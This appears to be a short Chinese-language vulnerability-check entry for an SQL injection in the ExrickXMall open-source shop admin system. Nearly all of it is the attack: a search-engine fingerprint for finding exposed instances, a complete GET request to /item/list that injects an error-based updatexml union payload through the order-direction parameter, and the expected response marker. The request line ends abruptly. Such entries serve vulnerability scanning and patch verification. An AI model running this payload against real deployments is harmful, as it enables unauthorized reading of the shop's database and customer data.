# ExrickXMall开源商城SQL注入漏洞

ExrickXMall ｜ SQL注入 ｜ —
- **指纹**：`app="XMall-后台管理系统"`
- **请求**：`GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(102103122),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=fal`
- **响应特征**：200 6cfe798ba8e